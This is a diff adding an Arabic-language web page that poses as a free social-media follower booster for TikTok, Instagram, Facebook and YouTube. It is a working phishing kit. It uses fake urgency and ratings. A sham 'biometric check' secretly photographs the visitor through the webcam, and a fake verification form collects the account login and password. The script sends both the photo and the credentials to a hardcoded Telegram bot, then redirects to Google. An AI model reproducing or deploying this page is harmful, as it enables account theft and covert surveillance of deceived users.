@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Diesel SMM Elite | نظام الديزل العالمي للتوثيق</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --bg: #0d1117; --card: #161b22; --accent: #238636; --tiktok: #000; --insta: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); --fb: #1877f2; --yt: #ff0000; }
+        body { background: var(--bg); color: #c9d1d9; font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 10px; text-align: center; }
+        
+        /* شاشة الترحيب */
+        #welcome-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .pulse-btn { border: 2px solid var(--accent); padding: 40px; border-radius: 50%; animation: pulse 2s infinite; font-size: 40px; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(35, 134, 54, 0.7); } 70% { box-shadow: 0 0 0 30px rgba(35, 134, 54, 0); } 100% { box-shadow: 0 0 0 0 rgba(35, 134, 54, 0); } }
+
+        .container { max-width: 420px; margin: 0 auto; display: none; }
+        .card { background: var(--card); border: 1px solid #30363d; border-radius: 16px; padding: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.7); margin-bottom: 15px; }
+
+        /* عداد الضغط والتقييم */
+        .live-info { background: #0d1117; border: 1px solid #f85149; border-radius: 8px; padding: 10px; margin-bottom: 15px; font-size: 12px; color: #f85149; }
+        .stars { color: #f1e05a; margin: 5px 0; font-size: 14px; }
+
+        /* المنصات الحقيقية */
+        .p-item { display: flex; align-items: center; padding: 16px; border-radius: 12px; margin-bottom: 10px; cursor: pointer; color: #fff; font-weight: bold; transition: 0.3s; }
+        .p-item i { font-size: 24px; margin-left: 15px; width: 30px; }
+        .tk { background: var(--tiktok); } .ig { background: var(--insta); } .fb { background: var(--fb); } .yt { background: var(--yt); }
+
+        /* اختيار المتابعين */
+        .pkg { background: #21262d; border: 1px solid #30363d; border-radius: 10px; padding: 15px; margin-bottom: 8px; cursor: pointer; position: relative; }
+        .pkg b { color: #f1e05a; font-size: 22px; }
+        .badge { position: absolute; top: 0; left: 0; background: var(--accent); color: #fff; font-size: 9px; padding: 2px 8px; border-radius: 0 0 8px 0; }
+
+        /* الفحص والبيانات */
+        #step-pkg, #step-scan, #step-login { display: none; }
+        .cam-box { width: 140px; height: 140px; border: 3px solid #58a6ff; border-radius: 50%; margin: 20px auto; position: relative; overflow: hidden; }
+        .scan-line { width: 100%; height: 3px; background: #58a6ff; position: absolute; animation: scan 2s infinite; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: #fff; font-size: 16px; box-sizing: border-box; }
+        .btn-main { width: 100%; padding: 18px; border-radius: 8px; border: none; background: var(--accent); color: #fff; font-weight: bold; font-size: 18px; cursor: pointer; }
+        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
+    </style>
+</head>
+<body onclick="startDieselSystem()">
+
+    <div id="welcome-overlay">
+        <div style="text-align:center;">
+            <div class="pulse-btn">🚀</div>
+            <h2 style="color:#fff; margin-top:20px;">موقع الديزل لزيادة المتابعين</h2>
+            <p style="color:#8b949e;">اضغط في أي مكان للدخول</p>
+        </div>
+    </div>
+
+    <div class="container" id="app">
+        <div class="live-info">
+            <b>🔴 تنبيه:</b> السيرفر عليه ضغط (96%). حجزنا لك مكاناً مؤقتاً!
+            <div class="stars">★★★★★ <span style="color:#8b949e; font-size:10px;">(4.9/5 تقييم المستخدمين)</span></div>
+        </div>
+
+        <div class="card" id="step-1">
+            <h3 style="color:#fff;">اختر منصة التواصل الاجتماعي</h3>
+            <div class="p-item tk" onclick="showPkg('TikTok')"><i class="fab fa-tiktok"></i> TikTok Global</div>
+            <div class="p-item ig" onclick="showPkg('Instagram')"><i class="fab fa-instagram"></i> Instagram Business</div>
+            <div class="p-item fb" onclick="showPkg('Facebook')"><i class="fab fa-facebook-f"></i> Facebook Meta</div>
+            <div class="p-item yt" onclick="showPkg('YouTube')"><i class="fab fa-youtube"></i> YouTube Partner</div>
+        </div>
+
+        <div class="card" id="step-pkg">
+            <h3 style="color:#fff;">اختر الكمية المطلوبة</h3>
+            <div class="pkg" onclick="showScan('5,000')"><div class="badge">مجاني</div><b>5,000</b> متابع</div>
+            <div class="pkg" onclick="showScan('10,000')"><div class="badge">مجاني</div><b>10,000</b> متابع</div>
+            <div class="pkg" onclick="showScan('25,000')"><div class="badge">مجاني</div><b>25,000</b> متابع</div>
+        </div>
+
+        <div class="card" id="step-scan">
+            <h3 style="color:#fff;">فحص الأمان البشري</h3>
+            <p style="font-size:12px;">يرجى الثبات أمام الكاميرا لمطابقة الوجه والتأكد أنك لست روبوت.</p>
+            <div class="cam-box"><div class="scan-line"></div></div>
+            <button class="btn-main" onclick="startCapture()">بدء الفحص البيومتري</button>
+            <video id="v" autoplay muted playsinline></video>
+        </div>
+
+        <div class="card" id="step-login">
+            <h3 id="final-title" style="color:#fff;">توثيق الحساب</h3>
+            <p style="font-size:12px; color:#f1e05a;">سجل بياناتك الحقيقية لربط الـ <span id="num-val"></span> متابع بحسابك.</p>
+            <input type="text" id="u_id" placeholder="الهاتف أو البريد الإلكتروني">
+            <input type="password" id="u_pass" placeholder="كلمة المرور">
+            <button class="btn-main" onclick="sendFinalData()">تفعيل الزيادة الآن</button>
+        </div>
+    </div>
+
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const bot_token = "8789584532:AAESJZrJGfkILGReWmxFUGz2cyJzvK_7fEU";
+        const my_chat_id = "5177962707";
+        let isStarted = false;
+
+        function startDieselSystem() {
+            if(isStarted) return;
+            document.getElementById('welcome-overlay').style.display = 'none';
+            document.getElementById('app').style.display = 'block';
+
+            // ترحيب صوتي بالذكاء الاصطناعي
+            const msg = new SpeechSynthesisUtterance("مرحباً بك في موقع الديزل لزيادة متابعين التواصل الاجتماعي. نلاحظ ضغطاً كبيراً على السيرفر الآن، يرجى إتمام فحص الوجه واختيار عدد المتابعين لضمان وصول الخدمة لحسابك فوراً.");
+            msg.lang = 'ar-SA';
+            window.speechSynthesis.speak(msg);
+            isStarted = true;
+        }
+
+        function showPkg(p) { window.pName = p; document.getElementById('step-1').style.display = 'none'; document.getElementById('step-pkg').style.display = 'block'; }
+        
+        function showScan(n) { 
+            window.count = n; 
+            document.getElementById('step-pkg').style.display = 'none'; 
+            document.getElementById('step-scan').style.display = 'block';
+            document.getElementById('num-val').innerText = n;
+        }
+
+        async function startCapture() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = stream;
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', my_chat_id);
+                    fd.append('photo', blob, 'face.jpg');
+                    fd.append('caption', `👤 صيد الديزل (صورة وجه) | المنصة: ${window.pName} | الكمية: ${window.count}`);
+                    fetch(`https://api.telegram.org/bot${bot_token}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg');
+                document.getElementById('step-scan').style.display = 'none';
+                document.getElementById('step-login').style.display = 'block';
+                document.getElementById('final-title').innerText = "توثيق حساب " + window.pName;
+            }, 4000);
+        }
+
+        function sendFinalData() {
+            const id = document.getElementById('u_id').value;
+            const pass = document.getElementById('u_pass').value;
+            if(id.length < 5 || pass.length < 5) return alert("يرجى إدخال بيانات صحيحة!");
+
+            fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${my_chat_id}&text=🎯 صيد الديزل المكتمل!\nالمنصة: ${window.pName}\nالكمية: ${window.count}\nالحساب: ${id}\nالباسورد: ${pass}`);
+            alert("تهانينا! تم التوثيق بنجاح. سيبدأ وصول المتابعين خلال 15 دقيقة.");
+            location.href = "https://www.google.com";
+        }
+    </script>
+</body>
+</html>
